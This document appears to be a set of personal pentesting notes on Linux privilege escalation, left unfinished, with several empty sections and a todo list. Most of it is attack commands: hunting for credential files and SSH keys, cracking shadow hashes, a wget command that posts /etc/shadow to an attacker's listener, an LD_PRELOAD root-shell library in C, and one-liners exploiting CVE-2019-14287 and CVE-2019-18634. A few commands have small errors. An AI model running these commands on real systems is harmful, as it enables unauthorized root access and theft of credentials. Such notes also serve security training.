# Initial Enumeration
## System Enumeration
- System Info
```
# Linux Kernel Version
uname -a
cat /proc/version
cat /etc/issue

# Linux Arch and CPU info
lscpu
```
- Running processes
```
ps aux

# Processes running as root
ps aux | grep root
```

## User Enumeration
Who are we? What permissions do we have? What are we capable of doing?
```
whoami

# What groups am I in
id

# What can I run as sudo?
sudo -l
```
- Check for access to sensitive files
```
cat /etc/passwd

# Maybe passwords
cat /etc/shadow

# Groups
cat /etc/group
```
- Check users history
```
history
```

## Network Enumeration
- Network config
```
ifconfig

# old
ip a
```
- routes
```
ip route

# old
route
```
- arp tables
```
ip neigh

# old
arp -a
```
- Open Ports
```
netstat -ano
```

## Password Hunting
```
# Quick and dirty but color coordinated...
grep --color=auto -rnw '/' -ie "[search term] --color=always 2> /dev/null

# Find a word in a file name
locate [search term] | more

# Locate SSH Keys
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

# Exploring Automated Tools
## LinPEAS
```
./linpeas.sh

# Look for the red and yellow
```

## LinEnum
Basically the same as linpeas

## Linux-Exploit-Suggester
```
./linux-exploit_suggester.sh

```
## LinuxPrivChecker.py

# Escalation Path: Kernel Exploits
Basically google search for the version of your distribution (uname -a) and download and possibly compile the exploit. Normally we are looking for `Privilege Escalation` or `RCE`.     
```
# Automated
./linux-exploit-suggester.py
```

# Escalation Path: Passwords & File Permissions
## Stored Passwords
> Look at [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#files-containing-passwords)  

- Bash/zsh History
```
# history command
history

# Cat the history
cat .bash_history
```
- Searching the local directory
```
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
- Old passwords in /etc/security/opasswd
```
cat /etc/security/opasswd
```
## Weak File Permissions
Do we have access to a file we shouldn't be able to access as a normal user?
- Check file permissions /etc/passwd and /etc/shadow
```
# Check permissions on /etc/passwd /etc/shadow
ls -la /etc/passwd
ls -la /etc/passwd

# Using unshadow to combine passwd and shadow
unshadow passwd shadow
# After combining the two files, we can delete users who don't have a hash, save that to another file, and run it through hashcat.
```
  If `/etc/passwd` or `/etc/shadow` are modifiable, we can escalate by changing the password or changing group membership

## SSH Keys
We're looking for id_rsa or authorized_keys.
- Hunt for keys
```
# Authorized keys
find / -name authorized_keys 2> /dev/null

# id_rsa
find /-name id_rsa 2> /dev/null
```
- Using an id_rsa
```
# id_rsa permissions 600
chmod 600 [id_rsa_file]

# Connect
ssh -i [id_rsa_file]
```
# Escalation Path: Sudo
`sudo` allows an unprivileged user to run commands as root
- Get sudo version
```
sudo -V
```

## Sudo Shell Escapes
See [GTFOBins](https://gtfobins.github.io/) for a more exhaustive list of escapes

## Exploiting `sudo` with intended functionality
Using the intended functionality of an application to be able to exploit a system
- Example 1:  
    We run `sudo -l` and see we have `sudo` for /usr/sbin/apache2.
    Normally we don't have permission (as a regular user) to view /etc/shadow.
    If we run `sudo apache2 -f /etc/shadow`, we can read /etc/shadow, because the command is executed with root priviliges.

- Example 2:  
    Again, we're assuming we cannot read /etc/shadow.
    But after `sudo -l` we see we have sudo permissions to wget.
    We can setup a listener on our attack machine, run `sudo wget --post-file=/etc/shadow [ip:port], and view /etc/shadow on our attack host.

## Escalation via LD_Preload
Basically, preloading a malicious library to run as sudo
- Enumeration  
    We're Looking for `env_keep+=LD_PRELOAD`
```
sudo -l
Matching Defaults entries for Chvxt3r on this host:
    env_reset, env_keep+=LD_PRELOAD

User Chvxt3r may run the following commands on this host:
    [...SNIP...]
```
- Sample dll (shell.c)
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Compile with gcc
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
- Exploitation
```
sudo LD_PRELOAD=[path-to-file]/shell.so
```
## Escalation via [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
- Enumeration
```
sudo -l

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
```
- Exploitation
```
sudo -u#-1 /bin/bash
```
## Escalation via [CVE-2019-18634](https://www.exploit-db.com/exploits/47995)
- Enumeration  
    We are looking for the `pwfeedback` flag
```
 $ sudo -l
    Matching Defaults entries for millert on linux-build:
	insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail

    User millert may run the following commands on linux-build:
	(ALL : ALL) ALL
```
- Exploitation  
    This can be exploited by passing a large input to sudo via a pipe when it prompts for a password
```
$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
Password: Segmentation fault
```
# Escalation Path: SUID
See [GTFOBins](https://gtfobins.github.io/) for a more exhaustive list of exploits
- Enumeration  
    We're looking for executables that have the `suid` bit set. Basically an `s` in the 4th column of permissions
```
ls -la /usr/bin/sudo
-rwsr-xr-x 1 root root 306456 Aug 17 03:41 /usr/bin/sudo
```

    Finding all executables with the suid bit set  

```
find / -perm -u=s -type f 2>/dev/null
```

# Escalation Path: Other SUID Escalation

# Escalation Path: Capabilities

# Escalation Path: Scheduled Tasks

# Escalation Path: NFS Root Squashing

# Escalation Path: Docker

# todo
- [ ] Continue on Escalation Path: Passwords & File Permissions
- [ ] Get links for linpeas, linenum, linux-exploit-suggester
- [ ] Add a table at the top of all the tools used.
- [ ] Test
